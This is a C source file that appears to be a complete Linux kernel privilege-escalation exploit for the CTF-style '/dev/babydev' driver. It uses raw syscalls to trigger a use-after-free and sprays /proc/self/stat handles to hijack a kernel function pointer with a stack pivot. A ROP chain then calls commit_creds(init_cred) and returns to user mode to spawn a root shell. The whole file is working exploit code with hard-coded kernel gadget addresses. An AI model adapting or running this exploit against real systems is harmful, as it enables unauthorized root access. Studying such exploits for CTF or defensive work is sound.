int read(int fd, void *buf, unsigned long count) {
        __asm__("mov rax, 0");
            __asm__("syscall");
}

int write(int fd, const void *buf, unsigned long count) {
        __asm__("mov rax, 1");
            __asm__("syscall");
}

int open(const char *pathname, int flags) {
    __asm__("mov rax, 2");
    __asm__("syscall");
}

int close(int fd) {
    __asm__("mov rax, 3");
    __asm__("syscall");
}

void *mmap(void *addr, unsigned long length, int prot, int flags, int fd, unsigned long offset) {
    __asm__("mov r10, rcx");
    __asm__("mov rax, 9");
    __asm__("syscall");
}


int ioctl(int fd, unsigned long request, ...) {
    __asm__("mov rax, 16");
    __asm__("syscall");
}

int execve(char *filename, char *const argv[], char *const envp[]) {
    __asm__("mov rax, 59");
    __asm__("syscall");
}

void exit(int status) {
    __asm__("mov rax, 60");
    __asm__("syscall");
}

void print_hex(unsigned long value) {
    char buf[19] = "0x";
    for (int i = 0xf; i >= 0; i--, value>>=4) {
        int x = value & 0xf;
        buf[i + 2] = x + (x <= 9 ? '0' : 'a' - 10);
    }
    buf[18] = '\n';
    write(1, buf, 19);
}

struct {
    void *rip;
    unsigned long cs;
    unsigned long rflags;
    void *rsp;
    unsigned long ss;
} frame;

void run_shell(void) {
    char *args[2] = {"/bin/sh"};
    execve(args[0], args, 0);
}

void save_frame(void) {
    __asm__("mov %q0, cs" : "=r" (frame.cs));
    __asm__("mov %q0, ss" : "=r" (frame.ss));
    __asm__("mov %q0, rsp" : "=r" (frame.rsp));
    __asm__("pushfq");
    __asm__("pop %q0" : "=r" (frame.rflags));
    frame.rip = run_shell;
}

// mov esp, 0x83000000 ; ret
unsigned long stack_pivot = 0xffffffff81038b06;
unsigned long commit_creds = 0xffffffff810a1420;
unsigned long init_cred = 0xffffffff81e48c60;
unsigned long pop_rdi = 0xffffffff810d238d;
unsigned long swapgs_pop_rbp = 0xffffffff81063694;
unsigned long iretq = 0xffffffff8107c0c0;

void _start(void) {
    save_frame();

    int fd = open("/dev/babydev", 2);
    int fd2 = open("/dev/babydev", 2);
    int statfds[0x100];
    ioctl(fd, 0x10001, 0x20);
    close(fd2);
    for (int i = 0; i < 0x100; i++) {
        statfds[i] = open("/proc/self/stat", 0);
    }
    write(fd, &stack_pivot, 8);

    mmap(0x83000000 - 0x1000, 0x2000, 3, 0x8032, -1, 0);
    unsigned long *fake_stack = 0x83000000;
    *fake_stack++ = pop_rdi;
    *fake_stack++ = init_cred;
    *fake_stack++ = commit_creds;
    *fake_stack++ = swapgs_pop_rbp;
    *fake_stack++ = 0;
    *fake_stack++ = iretq;
    *fake_stack++ = frame.rip;
    *fake_stack++ = frame.cs;
    *fake_stack++ = frame.rflags;
    *fake_stack++ = frame.rsp;
    *fake_stack++ = frame.ss;

    char c;
    for (int i = 0; i < 0x100; i++) {
        read(statfds[i], &c, 1);
    }

    exit(0);
}
